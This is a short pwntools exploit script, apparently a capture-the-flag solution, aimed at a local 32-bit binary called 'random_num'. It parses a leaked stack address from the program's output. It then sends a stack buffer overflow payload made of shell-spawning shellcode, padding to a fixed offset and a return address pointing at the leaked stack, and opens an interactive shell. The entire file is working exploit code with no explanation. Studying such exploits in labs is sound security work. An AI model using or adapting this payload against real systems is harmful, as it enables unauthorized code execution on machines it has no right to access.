from pwn import *
elf = ELF("./random_num")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context(arch="i386",os="linux")
def main():
    r = elf.process()
    offset = 108
    bss = 0x0804a02c
    shellcode = asm(shellcraft.sh())
    r.recvuntil("[+] Here is your random number : ")
    stack = int(r.recvline().strip(),8)
    print "[?] stack address : ",stack
    r.recvuntil("[+] What is your name : ")
    p = ""
    p += shellcode
    p += "A" * (offset - len(shellcode))
    p += p32(stack)
    r.sendline(p)
    r.interactive()
if __name__ == '__main__':
    main()
